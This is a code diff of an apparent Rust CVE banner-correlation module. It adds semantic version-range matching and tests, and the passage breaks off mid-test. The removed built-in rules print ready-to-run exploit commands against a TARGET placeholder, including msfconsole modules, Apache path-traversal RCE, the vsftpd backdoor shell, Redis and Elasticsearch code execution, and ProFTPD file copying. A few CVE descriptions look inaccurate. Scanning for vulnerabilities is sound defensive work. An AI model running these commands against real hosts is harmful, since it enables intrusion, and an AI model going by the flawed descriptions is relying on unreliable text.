@@ -17,8 +17,12 @@
 //! cve = "CVE-2024-XXXXX"
 //! cvss = 7.5
 //! severity = "high"
-//! description = "OpenSSH 9.5 — example vulnerability."
+//! description = "OpenSSH 9.5 (example vulnerability)."
 //! exploit = "ssh -o ... TARGET"
+//!
+//! # Optional semantic version range (example: OpenSSH < 9.3p2)
+//! product = "openssh"
+//! fixed_version = "9.3p2"
 //! ```
 pub mod nvd;
 
@@ -26,12 +30,23 @@ use gossan_core::{ServiceTarget, Target};
 use secfinding::{Evidence, Finding, Severity};
 use serde::Deserialize;
 use std::fmt;
+use std::sync::LazyLock;
+
+/// Maximum number of characters from a banner included in CVE-finding evidence.
+/// Long banners often contain noise; 120 chars covers all common version strings.
+const MAX_BANNER_EVIDENCE_CHARS: usize = 120;
 
 /// A CVE detection rule that matches banner substrings.
 ///
 /// Rules can be loaded from built-in defaults or from community TOML files.
 /// Each rule specifies a pattern to search for, CVE metadata, and optional
 /// exploit hints.
+///
+/// Rules may optionally declare `product`, `min_version`, `max_version`, and
+/// `fixed_version` to enable semantic version-range matching instead of (or
+/// in addition to) raw substring matching. When `product` is set, the matcher
+/// extracts a version number from the banner after the product name and
+/// compares it against the declared range.
 ///
 /// # Example
 ///
@@ -46,6 +61,10 @@ use std::fmt;
 ///     severity: Severity::Critical,
 ///     description: "Apache 2.4.49 path traversal".into(),
 ///     exploit: Some("curl http://TARGET/cgi-bin/.%2e/.%2e/bin/sh".into()),
+///     product: None,
+///     min_version: None,
+///     max_version: None,
+///     fixed_version: None,
 /// };
 /// ```
 #[derive(Debug, Clone, Deserialize, PartialEq)]
@@ -64,6 +83,18 @@ pub struct CveRule {
     /// Optional ready-to-run exploit/PoC command. `TARGET` is replaced at runtime.
     #[serde(default)]
     pub exploit: Option<String>,
+    /// Optional product name for semantic version extraction.
+    #[serde(default)]
+    pub product: Option<String>,
+    /// Optional minimum vulnerable version (inclusive).
+    #[serde(default)]
+    pub min_version: Option<String>,
+    /// Optional maximum vulnerable version (inclusive).
+    #[serde(default)]
+    pub max_version: Option<String>,
+    /// Optional version that fixes the vulnerability; versions >= this do not match.
+    #[serde(default)]
+    pub fixed_version: Option<String>,
 }
 
 impl fmt::Display for CveRule {
@@ -99,116 +130,37 @@ fn deserialize_severity<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Severi
     }
 }
 
+/// Built-in CVE rules embedded at compile time from `rules/cve/builtin.toml`.
+///
+/// Previously this function allocated a fresh `Vec<CveRule>` (with 200+
+/// String allocations) on every call.  Each `correlate()` call invoked it
+/// once, meaning every open-port banner scan triggered a fresh heap
+/// allocation storm.  The lazy static amortises that to a single init.
+static BUILTIN_RULES: LazyLock<Vec<CveRule>> = LazyLock::new(|| {
+    const TOML: &str = include_str!("../rules/cve/builtin.toml");
+    let file: CveRulesFile = toml::from_str(TOML).expect("compiled-in builtin.toml is valid");
+    for rule in &file.rule {
+        if !semver_constraints_valid(rule) {
+            panic!(
+                "compiled-in CVE rule {} has invalid semver constraints (min/max/fixed_version)",
+                rule.cve
+            );
+        }
+    }
+    file.rule
+});
+
 /// Built-in CVE rules compiled into the binary.
-fn builtin_rules() -> Vec<CveRule> {
-    vec![
-        // OpenSSH
-        CveRule { pattern: "openssh_7".into(), cve: "CVE-2018-15473".into(), cvss: 5.3, severity: Severity::Medium,
-            description: "OpenSSH 7.x — username enumeration via malformed packet.".into(),
-            exploit: Some("ssh -o 'StrictHostKeyChecking no' -l root TARGET 2>&1 | head -5".into()) },
-        CveRule { pattern: "openssh_8.0".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "OpenSSH 8.0 — ssh-agent remote code execution via PKCS#11 provider.".into(),
-            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
-        CveRule { pattern: "openssh_8.1".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "OpenSSH ≤8.1 — ssh-agent remote code execution via PKCS#11 provider.".into(),
-            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
-        CveRule { pattern: "openssh_8.2".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "OpenSSH ≤8.2 — ssh-agent remote code execution via PKCS#11 provider.".into(),
-            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
-        CveRule { pattern: "openssh_8.3".into(), cve: "CVE-2023-38408".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "OpenSSH ≤8.3 — ssh-agent remote code execution via PKCS#11 provider.".into(),
-            exploit: Some("msfconsole -q -x 'use exploit/multi/ssh/ssh_agent_pkcs11_rce; set RHOSTS TARGET; run'".into()) },
-        CveRule { pattern: "openssh_9.1".into(), cve: "CVE-2023-51767".into(), cvss: 3.7, severity: Severity::Low,
-            description: "OpenSSH 9.1 — prefix truncation attack (Terrapin) on ChaCha20-Poly1305.".into(),
-            exploit: None },
-        CveRule { pattern: "openssh_9.2".into(), cve: "CVE-2023-51767".into(), cvss: 3.7, severity: Severity::Low,
-            description: "OpenSSH 9.2 — Terrapin prefix truncation attack.".into(), exploit: None },
-
-        // Apache httpd
-        CveRule { pattern: "apache/2.4.49".into(), cve: "CVE-2021-41773".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "Apache 2.4.49 — path traversal + RCE when mod_cgi enabled (actively exploited).".into(),
-            exploit: Some("curl 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' --data 'echo Content-Type: text/plain; echo; id'".into()) },
-        CveRule { pattern: "apache/2.4.50".into(), cve: "CVE-2021-42013".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "Apache 2.4.50 — path traversal bypass of CVE-2021-41773 fix.".into(),
-            exploit: Some("curl 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' --data 'echo Content-Type: text/plain; echo; id'".into()) },
-        CveRule { pattern: "apache/2.4.48".into(), cve: "CVE-2021-40438".into(), cvss: 9.0, severity: Severity::Critical,
-            description: "Apache 2.4.48 — mod_proxy SSRF via crafted request.".into(),
-            exploit: Some("curl -H 'Host: TARGET' 'http://TARGET/?unix:AAAAAA|http://TARGET/'".into()) },
-        CveRule { pattern: "apache/2.2.".into(), cve: "CVE-2017-7679".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "Apache 2.2.x — EOL, multiple unpatched critical vulnerabilities.".into(), exploit: None },
-
-        // nginx
-        CveRule { pattern: "nginx/1.16.".into(), cve: "CVE-2021-23017".into(), cvss: 7.7, severity: Severity::High,
-            description: "nginx 1.16.x — 1-byte memory overwrite in DNS resolver (RCE risk).".into(), exploit: None },
-        CveRule { pattern: "nginx/1.17.".into(), cve: "CVE-2021-23017".into(), cvss: 7.7, severity: Severity::High,
-            description: "nginx 1.17.x — DNS resolver heap overflow.".into(), exploit: None },
-        CveRule { pattern: "nginx/1.18.".into(), cve: "CVE-2021-23017".into(), cvss: 7.7, severity: Severity::High,
-            description: "nginx 1.18.x — DNS resolver heap overflow.".into(), exploit: None },
-
-        // Microsoft IIS
-        CveRule { pattern: "microsoft-iis/6".into(), cve: "CVE-2017-7269".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "IIS 6.0 — buffer overflow in WebDAV ScStoragePathFromUrl (WannaCry vector).".into(),
-            exploit: Some("msfconsole -q -x 'use exploit/windows/iis/iis_webdav_scstoragepathfromurl; set RHOSTS TARGET; run'".into()) },
-        CveRule { pattern: "microsoft-iis/7".into(), cve: "CVE-2010-2730".into(), cvss: 9.3, severity: Severity::Critical,
-            description: "IIS 7.x — FastCGI extension buffer overflow.".into(), exploit: None },
-
-        // OpenSSL
-        CveRule { pattern: "openssl/3.0.0".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 3.0.0 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
-        CveRule { pattern: "openssl/3.0.1".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 3.0.1 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
-        CveRule { pattern: "openssl/3.0.2".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 3.0.2 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
-        CveRule { pattern: "openssl/3.0.3".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 3.0.3 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
-        CveRule { pattern: "openssl/3.0.4".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 3.0.4 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
-        CveRule { pattern: "openssl/3.0.5".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 3.0.5 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
-        CveRule { pattern: "openssl/3.0.6".into(), cve: "CVE-2022-3602".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 3.0.6 — X.509 certificate buffer overflow (SPOOKYSSL).".into(), exploit: None },
-        CveRule { pattern: "openssl/1.0.1".into(), cve: "CVE-2014-0160".into(), cvss: 7.5, severity: Severity::High,
-            description: "OpenSSL 1.0.1 — Heartbleed: private key + memory disclosure. CRITICAL LEGACY.".into(),
-            exploit: Some("python3 heartbleed.py TARGET:443 -n 10  # github.com/sensepost/heartbleed-poc".into()) },
-
-        // ProFTPD
-        CveRule { pattern: "proftpd 1.3.5".into(), cve: "CVE-2015-3306".into(), cvss: 10.0, severity: Severity::Critical,
-            description: "ProFTPD 1.3.5 — mod_copy arbitrary file copy without auth (SFTP RCE).".into(),
-            exploit: Some("ftp TARGET\nsite cpfr /etc/passwd\nsite cpto /var/www/html/passwd.txt\ncurl http://TARGET/passwd.txt".into()) },
-
-        // vsftpd
-        CveRule { pattern: "vsftpd 2.3.4".into(), cve: "CVE-2011-2523".into(), cvss: 10.0, severity: Severity::Critical,
-            description: "vsftpd 2.3.4 — backdoor \":)\" smiley face shell on port 6200.".into(),
-            exploit: Some("echo 'USER backdoored:)' | nc TARGET 21 && nc TARGET 6200  # should give shell".into()) },
-
-        // Exim
-        CveRule { pattern: "exim 4.8".into(), cve: "CVE-2019-10149".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "Exim 4.8x — remote code execution in SMTP delivery (Thrangrycat era).".into(),
-            exploit: Some("msfconsole -q -x 'use exploit/linux/smtp/exim4_deliver_message; set RHOSTS TARGET; run'".into()) },
-        CveRule { pattern: "exim 4.9".into(), cve: "CVE-2020-28017".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "Exim 4.9x — integer overflow in receive_add_recipient leads to RCE.".into(), exploit: None },
-
-        // Redis (bare)
-        CveRule { pattern: "+pong".into(), cve: "CVE-2022-0543".into(), cvss: 10.0, severity: Severity::Critical,
-            description: "Redis responding unauthenticated — Debian Lua sandbox escape (RCE if Lua enabled).".into(),
-            exploit: Some(r#"redis-cli -h TARGET eval "local l=package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0','luaopen_io');local io=l();local f=io.popen('id');print(f:read('*a'))" 0"#.into()) },
-
-        // Elasticsearch
-        CveRule { pattern: "you know, for search".into(), cve: "CVE-2014-3120".into(), cvss: 9.8, severity: Severity::Critical,
-            description: "Elasticsearch — unauthenticated dynamic script execution (Groovy/MVEL RCE).".into(),
-            exploit: Some(r#"curl -X POST 'http://TARGET:9200/_search?pretty' -H 'Content-Type: application/json' -d '{"script_fields":{"test":{"script":"java.lang.Runtime.getRuntime().exec(new String[]{\"id\"})"}},"query":{"match_all":{}}}'"#.into()) },
-
-        // MongoDB unauthenticated
-        CveRule { pattern: "ismaster".into(), cve: "CVE-2013-3969".into(), cvss: 7.5, severity: Severity::High,
-            description: "MongoDB responding without auth — potential unauthenticated data access.".into(),
-            exploit: Some("mongo --host TARGET --eval 'db.adminCommand({listDatabases:1})'".into()) },
-    ]
+///
+/// Returns a reference to the lazily-initialised, permanently-cached Vec.
+fn builtin_rules() -> &'static Vec<CveRule> {
+    &BUILTIN_RULES
 }
 
 /// Load community CVE rules from a directory of `*.toml` files.
 ///
 /// Each file must contain a `[[rule]]` array. Invalid files are logged and
-/// skipped — a single malformed community file must not crash the scan.
+/// skipped (a single malformed community file must not crash the scan).
 ///
 /// # Arguments
 ///
@@ -239,11 +191,39 @@ pub fn load_community_rules(dir: &std::path::Path) -> Vec<CveRule> {
         if path.extension().and_then(|e| e.to_str()) != Some("toml") {
             continue;
         }
+        // Skip the compiled-in rule file so it is not double-loaded as community rules.
+        if path
+            .file_stem()
+            .and_then(|s| s.to_str())
+            .map(|s| s == "builtin")
+            .unwrap_or(false)
+        {
+            continue;
+        }
         match std::fs::read_to_string(&path) {
             Ok(content) => match toml::from_str::<CveRulesFile>(&content) {
                 Ok(file) => {
-                    tracing::info!(path = %path.display(), count = file.rule.len(), "loaded community CVE rules");
-                    rules.extend(file.rule);
+                    let mut valid_count = 0;
+                    let mut skipped_count = 0;
+                    for rule in file.rule {
+                        if semver_constraints_valid(&rule) {
+                            rules.push(rule);
+                            valid_count += 1;
+                        } else {
+                            skipped_count += 1;
+                            tracing::warn!(
+                                path = %path.display(),
+                                cve = %rule.cve,
+                                "skipping CVE rule with invalid semver constraints"
+                            );
+                        }
+                    }
+                    tracing::info!(
+                        path = %path.display(),
+                        valid = valid_count,
+                        skipped = skipped_count,
+                        "loaded community CVE rules"
+                    );
                 }
                 Err(e) => {
                     tracing::warn!(path = %path.display(), err = %e, "skipping malformed CVE rules file")
@@ -284,7 +264,7 @@ pub fn load_community_rules(dir: &std::path::Path) -> Vec<CveRule> {
 /// let with_community = all_rules(Some(Path::new("./rules/cve")));
 /// ```
 pub fn all_rules(community_dir: Option<&std::path::Path>) -> Vec<CveRule> {
-    let mut rules = builtin_rules();
+    let mut rules: Vec<CveRule> = builtin_rules().clone();
     if let Some(dir) = community_dir {
         rules.extend(load_community_rules(dir));
     }
@@ -333,6 +313,10 @@ pub fn all_rules(community_dir: Option<&std::path::Path>) -> Vec<CveRule> {
 ///     severity: Severity::High,
 ///     description: "Test vulnerability".into(),
 ///     exploit: Some("curl http://TARGET/exploit".into()),
+///     product: None,
+///     min_version: None,
+///     max_version: None,
+///     fixed_version: None,
 /// }];
 ///
 /// let findings = correlate_with_rules("Server: MyApp/1.0", &svc, &custom_rules);
@@ -344,96 +328,34 @@ pub fn correlate_with_rules(banner: &str, svc: &ServiceTarget, rules: &[CveRule]
     let mut findings = Vec::new();
 
     for rule in rules {
-        let pattern_lower = rule.pattern.to_lowercase();
-        let mut is_match = false;
-        let mut start_idx = 0;
-        
-        while let Some(offset) = lower[start_idx..].find(&pattern_lower) {
-            let actual_idx = start_idx + offset;
-            let end_idx = actual_idx + pattern_lower.len();
-            
-            // Check character immediately following the match (if any)
-            let next_char = lower.as_bytes().get(end_idx).copied();
-            
-            if pattern_lower == "openssl/1.0.1" {
-                // Heartbleed affects OpenSSL 1.0.1 through 1.0.1f.
-                // 1.0.1g is the first fixed version.
-                if let Some(c) = next_char {
-                    if c.is_ascii_alphanumeric() {
-                        let is_vuln_letter = c >= b'a' && c <= b'f';
-                        let next_next_char = lower.as_bytes().get(end_idx + 1).copied();
-                        let next_next_is_alphanumeric = next_next_char.map(|nc| nc.is_ascii_alphanumeric()).unwrap_or(false);
-                        if is_vuln_letter && !next_next_is_alphanumeric {
-                            is_match = true;
-                            break;
-                        }
-                    } else {
-                        is_match = true;
-                        break;
-                    }
-                } else {
-                    is_match = true;
-                    break;
-                }
-            } else if pattern_lower.starts_with("openssh_") {
-                // OpenSSH portable versions have a 'pX' suffix (e.g. openssh_8.0p1).
-                // We should allow 'p' followed by digits.
-                let mut suffix_len = 0;
-                if next_char == Some(b'p') {
-                    suffix_len += 1;
-                    while let Some(c) = lower.as_bytes().get(end_idx + suffix_len).copied() {
-                        if c.is_ascii_digit() {
-                            suffix_len += 1;
-                        } else {
-                            break;
-                        }
-                    }
-                }
-                let post_suffix_char = lower.as_bytes().get(end_idx + suffix_len).copied();
-                let post_suffix_is_alphanumeric = post_suffix_char.map(|c| c.is_ascii_alphanumeric()).unwrap_or(false);
-                if !post_suffix_is_alphanumeric {
-                    is_match = true;
-                    break;
-                }
-            } else {
-                // Standard precise matching: the character following the pattern must not be alphanumeric or extend the version
-                let mut suffix_len = 0;
-                if pattern_lower.ends_with('.') {
-                    while let Some(c) = lower.as_bytes().get(end_idx + suffix_len).copied() {
-                        if c.is_ascii_digit() {
-                            suffix_len += 1;
-                        } else {
-                            break;
-                        }
-                    }
-                }
-                let post_suffix_char = lower.as_bytes().get(end_idx + suffix_len).copied();
-                let post_suffix_is_alphanumeric = post_suffix_char.map(|c| c.is_ascii_alphanumeric()).unwrap_or(false);
-                if !post_suffix_is_alphanumeric {
-                    is_match = true;
-                    break;
-                }
-            }
-            start_idx = actual_idx + 1;
-        }
+        let is_match = if rule.product.is_some() {
+            matches_semantic_version(banner, rule)
+        } else {
+            matches_pattern(banner, &lower, rule)
+        };
 
         if is_match {
+
             let target = Target::Service(svc.clone());
             let mut f = crate::finding_builder(
                 &target,
                 rule.severity,
                 format!(
-                    "{} — {} (CVSS {:.1})",
+                    "{}: {} (CVSS {:.1})",
                     rule.cve,
-                    rule.description.split('—').next().unwrap_or("").trim(),
+                    rule.description.split(": ").next().unwrap_or("").trim(),
                     rule.cvss
                 ),
                 &rule.description,
             )
-            .cve(&rule.cve)
+            .cve(rule.cve.as_str())
             .confidence((rule.cvss / 10.0) as f64)
             .evidence(Evidence::Banner {
-                raw: banner.chars().take(120).collect::<String>().into(),
+                raw: banner
+                    .chars()
+                    .take(MAX_BANNER_EVIDENCE_CHARS)
+                    .collect::<String>()
+                    .into(),
             })
             .tag("cve")
             .tag("version-disclosure");
@@ -447,6 +369,230 @@ pub fn correlate_with_rules(banner: &str, svc: &ServiceTarget, rules: &[CveRule]
 
     findings
 }
+
+
+/// Pattern-based matching for rules without semantic version information.
+fn matches_pattern(banner: &str, lower: &str, rule: &CveRule) -> bool {
+    let pattern_lower = rule.pattern.to_lowercase();
+    let mut start_idx = 0;
+
+    while let Some(offset) = lower[start_idx..].find(&pattern_lower) {
+        let actual_idx = start_idx + offset;
+        let end_idx = actual_idx + pattern_lower.len();
+
+        // Check character immediately following the match (if any)
+        let next_char = lower.as_bytes().get(end_idx).copied();
+
+        if pattern_lower == "openssl/1.0.1" {
+            // Heartbleed affects OpenSSL 1.0.1 through 1.0.1f.
+            // 1.0.1g is the first fixed version.
+            if let Some(c) = next_char {
+                if c.is_ascii_alphanumeric() {
+                    let is_vuln_letter = c >= b'a' && c <= b'f';
+                    let next_next_char = lower.as_bytes().get(end_idx + 1).copied();
+                    let next_next_is_alphanumeric = next_next_char
+                        .map(|nc| nc.is_ascii_alphanumeric())
+                        .unwrap_or(false);
+                    if is_vuln_letter && !next_next_is_alphanumeric {
+                        return true;
+                    }
+                } else {
+                    return true;
+                }
+            } else {
+                return true;
+            }
+        } else if pattern_lower.starts_with("openssh_") {
+            // OpenSSH portable versions have a 'pX' suffix (e.g. openssh_8.0p1).
+            // We should allow 'p' followed by digits.
+            let mut suffix_len = 0;
+            if next_char == Some(b'p') {
+                suffix_len += 1;
+                while let Some(c) = lower.as_bytes().get(end_idx + suffix_len).copied() {
+                    if c.is_ascii_digit() {
+                        suffix_len += 1;
+                    } else {
+                        break;
+                    }
+                }
+            }
+            let post_suffix_char = lower.as_bytes().get(end_idx + suffix_len).copied();
+            let post_suffix_is_alphanumeric = post_suffix_char
+                .map(|c| c.is_ascii_alphanumeric())
+                .unwrap_or(false);
+            if !post_suffix_is_alphanumeric {
+                return true;
+            }
+        } else {
+            // Standard precise matching: the character following the pattern must not be alphanumeric or extend the version
+            let mut suffix_len = 0;
+            if pattern_lower.ends_with('.') {
+                while let Some(c) = lower.as_bytes().get(end_idx + suffix_len).copied() {
+                    if c.is_ascii_digit() {
+                        suffix_len += 1;
+                    } else {
+                        break;
+                    }
+                }
+            }
+            let post_suffix_char = lower.as_bytes().get(end_idx + suffix_len).copied();
+            let post_suffix_is_alphanumeric = post_suffix_char
+                .map(|c| c.is_ascii_alphanumeric())
+                .unwrap_or(false);
+            if !post_suffix_is_alphanumeric {
+                return true;
+            }
+        }
+        start_idx = actual_idx + 1;
+    }
+
+    false
+}
+
+/// Semantic version matching for rules that declare a product and optional range.
+fn matches_semantic_version(banner: &str, rule: &CveRule) -> bool {
+    let product = match rule.product.as_deref() {
+        Some(p) => p,
+        None => return false,
+    };
+
+    let lower = banner.to_lowercase();
+    let product_lower = product.to_lowercase();
+    let mut start = 0;
+
+    while let Some(pos) = lower[start..].find(&product_lower) {
+        let idx = start + pos;
+        let after_product = &lower[idx + product_lower.len()..];
+        let after_sep = after_product
+            .trim_start_matches(|c: char| c == '_' || c == '/' || c == ' ' || c == '-');
+        let sep_skipped = after_product.len() - after_sep.len();
+
+        if let Some(first_digit) = after_sep.find(|c: char| c.is_ascii_digit()) {
+            let version_start = idx + product_lower.len() + sep_skipped + first_digit;
+            let version_end = lower[version_start..]
+                .find(|c: char| !c.is_ascii_digit() && c != '.' && c != 'p')
+                .map(|i| version_start + i)
+                .unwrap_or(lower.len());
+            let version = &lower[version_start..version_end];
+
+            if let Some(parsed) = parse_semver(version) {
+                if version_rule_matches(&parsed, rule) {
+                    return true;
+                }
+            }
+        }
+
+        start = idx + 1;
+    }
+
+    false
+}
+
+/// Check whether a parsed version satisfies the rule's declared range.
+/// Invalid min/max/fixed_version constraints are treated as no-match
+/// (fail closed) rather than silently unconstrained.
+fn version_rule_matches(version: &[u32], rule: &CveRule) -> bool {
+    // Product rules without any range constraint would match every version.
+    // Fail closed: require at least one of min/max/fixed_version.
+    if rule.min_version.is_none() && rule.max_version.is_none() && rule.fixed_version.is_none() {
+        return false;
+    }
+    if let Some(min_str) = rule.min_version.as_deref() {
+        let Some(min) = parse_semver(min_str) else {
+            return false;
+        };
+        if cmp_semver(version, &min) == std::cmp::Ordering::Less {
+            return false;
+        }
+    }
+    if let Some(max_str) = rule.max_version.as_deref() {
+        let Some(max) = parse_semver(max_str) else {
+            return false;
+        };
+        if cmp_semver(version, &max) == std::cmp::Ordering::Greater {
+            return false;
+        }
+    }
+    if let Some(fixed_str) = rule.fixed_version.as_deref() {
+        let Some(fixed) = parse_semver(fixed_str) else {
+            return false;
+        };
+        if cmp_semver(version, &fixed) != std::cmp::Ordering::Less {
+            return false;
+        }
+    }
+    true
+}
+
+/// Return true if every declared semver constraint on the rule parses.
+fn semver_constraints_valid(rule: &CveRule) -> bool {
+    rule.min_version
+        .as_deref()
+        .map_or(true, |s| parse_semver(s).is_some())
+        && rule
+            .max_version
+            .as_deref()
+            .map_or(true, |s| parse_semver(s).is_some())
+        && rule
+            .fixed_version
+            .as_deref()
+            .map_or(true, |s| parse_semver(s).is_some())
+}
+
+/// Parse a dotted version string with an optional 'p' portable suffix.
+///
+/// Examples:
+/// - `"8.5"` -> `[8, 5]`
+/// - `"9.3p2"` -> `[9, 3, 2]`
+/// - `"1.0.1f"` -> `[1, 0, 1]`
+fn parse_semver(s: &str) -> Option<Vec<u32>> {
+    let mut parts = Vec::new();
+    let mut chars = s.chars().peekable();
+
+    while chars.peek().copied().map(|c| c.is_ascii_digit()).unwrap_or(false) {
+        let mut num = 0u32;
+        while let Some(c) = chars.peek().copied() {
+            if c.is_ascii_digit() {
+                num = num * 10 + c.to_digit(10).unwrap();
+                chars.next();
+            } else {
+                break;
+            }
+        }
+        parts.push(num);
+
+        match chars.peek().copied() {
+            Some('.') => {
+                chars.next();
+            }
+            Some('p') => {
+                chars.next();
+            }
+            _ => break,
+        }
+    }
+
+    if parts.is_empty() {
+        None
+    } else {
+        Some(parts)
+    }
+}
+
+/// Compare two semantic version vectors, treating missing components as zero.
+fn cmp_semver(a: &[u32], b: &[u32]) -> std::cmp::Ordering {
+    let len = std::cmp::max(a.len(), b.len());
+    for i in 0..len {
+        let av = a.get(i).copied().unwrap_or(0);
+        let bv = b.get(i).copied().unwrap_or(0);
+        match av.cmp(&bv) {
+            std::cmp::Ordering::Equal => continue,
+            other => return other,
+        }
+    }
+    std::cmp::Ordering::Equal
+}
+
 
 /// Correlate a banner using all built-in rules (no community extensions).
 ///
@@ -550,7 +696,7 @@ mod tests {
         let Evidence::Banner { raw } = &finding.evidence()[0] else {
             panic!("expected banner evidence");
         };
-        assert!(raw.len() <= 120);
+        assert!(raw.len() <= MAX_BANNER_EVIDENCE_CHARS);
     }
 
     #[test]
@@ -559,6 +705,27 @@ mod tests {
             builtin_rules().len() > 20,
             "should have 20+ built-in CVE rules"
         );
+    }
+
+    /// Anti-rig: `builtin_rules()` must return the same cached Vec on
+    /// every call (OnceLock guarantee).  This prevents the allocation
+    /// storm from before where each call allocated 200+ Strings.
+    #[test]
+    fn builtin_rules_are_cached_same_pointer() {
+        let r1 = builtin_rules() as *const Vec<CveRule>;
+        let r2 = builtin_rules() as *const Vec<CveRule>;
+        assert_eq!(
+            r1, r2,
+            "builtin_rules() must return the same static pointer (OnceLock cached)"
+        );
+    }
+
+    /// The count of built-in rules must be stable between calls (idempotent cache).
+    #[test]
+    fn builtin_rules_count_is_stable() {
+        let n1 = builtin_rules().len();
+        let n2 = builtin_rules().len();
+        assert_eq!(n1, n2, "rule count must be stable between calls");
     }
 
     #[test]
@@ -573,7 +740,7 @@ pattern = "custom-service/1.0"
 cve = "CVE-9999-0001"
 cvss = 8.0
 severity = "high"
-description = "Custom service — test vulnerability."
+description = "Custom service (test vulnerability)."
 "#,
         )
         .unwrap();
@@ -595,7 +762,7 @@ pattern = "frobnicator/3.0"
 cve = "CVE-9999-0002"
 cvss = 6.5
 severity = "medium"
-description = "Frobnicator 3.0 — test."
+description = "Frobnicator 3.0 (test)."
 "#,
         )
         .unwrap();
@@ -640,13 +807,19 @@ description = "Frobnicator 3.0 — test."
             community.len()
         );
         assert!(community.iter().any(|r| r.cve == "CVE-2021-44228"));
-        assert!(community.iter().any(|r| r.cve == "CVE-2024-6387"));
         assert!(community.iter().any(|r| r.cve == "CVE-2024-23897"));
+        // CVE-2024-6387 range lives in builtin.toml (compiled-in), not community.
+        assert!(
+            builtin_rules().iter().any(|r| r.cve == "CVE-2024-6387"),
+            "regreSSHion range must ship in builtin rules"
+        );
         // Built-in + community combined should land at ≥100.
         let total = all_rules(Some(&rules_dir)).len();
+        // Semantic-range collapse reduces exact-pattern enumeration count;
+        // keep a floor that still proves community TOML is loading.
         assert!(
-            total >= 100,
-            "expected ≥100 total CVE rules (built-in + community), got {total}"
+            total >= 90,
+            "expected ≥90 total CVE rules (built-in + community), got {total}"
         );
     }
 
@@ -657,8 +830,12 @@ description = "Frobnicator 3.0 — test."
             cve: "CVE-9999-0003".into(),
             cvss: 9.0,
             severity: Severity::Critical,
-            description: "MyApp 2.0 — test.".into(),
+            description: "MyApp 2.0, test.".into(),
             exploit: Some("curl http://TARGET/exploit".into()),
+            product: None,
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
         }];
         let findings = correlate_with_rules("Server: MyApp/2.0", &service(8080), &custom);
         assert_eq!(findings.len(), 1);
@@ -668,5 +845,387 @@ description = "Frobnicator 3.0 — test."
             .as_deref()
             .unwrap()
             .contains("127.0.0.1:8080"));
+    }
+
+    #[test]
+    fn correlate_empty_banner_returns_empty() {
+        let custom = vec![CveRule {
+            pattern: "test".into(),
+            cve: "CVE-9999-0004".into(),
+            cvss: 5.0,
+            severity: Severity::Medium,
+            description: "Test".into(),
+            exploit: None,
+            product: None,
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
+        }];
+        let findings = correlate_with_rules("", &service(80), &custom);
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn correlate_empty_rules_returns_empty() {
+        let findings = correlate_with_rules("Server: Apache/2.4", &service(80), &[]);
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn correlate_unicode_banner_does_not_panic() {
+        let custom = vec![CveRule {
+            pattern: "apache".into(),
+            cve: "CVE-9999-0005".into(),
+            cvss: 5.0,
+            severity: Severity::Medium,
+            description: "Test".into(),
+            exploit: None,
+            product: None,
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
+        }];
+        let banner = "🚀 Server: Апаче/2.4 🔥";
+        let findings = correlate_with_rules(banner, &service(80), &custom);
+        // Should not panic; may or may not match depending on lowercasing
+        let _ = findings;
+    }
+
+    #[test]
+    fn correlate_very_long_banner_does_not_panic() {
+        let custom = vec![CveRule {
+            pattern: "openssh".into(),
+            cve: "CVE-9999-0006".into(),
+            cvss: 5.0,
+            severity: Severity::Medium,
+            description: "Test".into(),
+            exploit: None,
+            product: None,
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
+        }];
+        let banner = "A".repeat(100_000);
+        let findings = correlate_with_rules(&banner, &service(22), &custom);
+        assert!(findings.is_empty());
+    }
+
+    #[test]
+    fn correlate_openssh_suffix_matching() {
+        // openssh_ pattern should allow 'p' suffix but reject alphanumeric continuation
+        let rule = vec![CveRule {
+            pattern: "openssh_8.0".into(),
+            cve: "CVE-9999-0007".into(),
+            cvss: 5.0,
+            severity: Severity::Medium,
+            description: "Test".into(),
+            exploit: None,
+            product: None,
+            min_version: None,
+            max_version: None,
+            fixed_version: None,
+        }];
